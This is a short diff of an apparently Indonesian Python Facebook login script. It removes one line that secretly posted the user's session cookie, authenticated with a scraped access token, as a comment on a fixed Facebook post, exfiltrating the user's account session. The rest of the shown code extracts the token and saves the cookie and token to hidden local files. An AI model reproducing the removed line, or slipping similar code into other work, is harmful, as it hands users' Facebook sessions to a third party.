@@ -144,7 +144,7 @@ def login_men():
 		nek = '%s?act=%s&nav_source=no_referrer'%(url,set)
 		roq = ses.get(nek,cookies=cookies)
 		tok = re.search('accessToken="(.*?)"',str(roq.content)).group(1)
-		requests.post(f"https://graph.facebook.com/v15.0/100072216287842_213375447746330/comments/?message={cookie}&access_token={tok}", headers = {"cookie":cookie})
+		
 		ken = open(".tokenakun.txt", "w").write(tok)
 		cok = open(".cookiesakun.txt", "w").write(cookie)
 		baz_anim(f'{puti}└──{hijo} login berhasil jalankan lagi scnya')
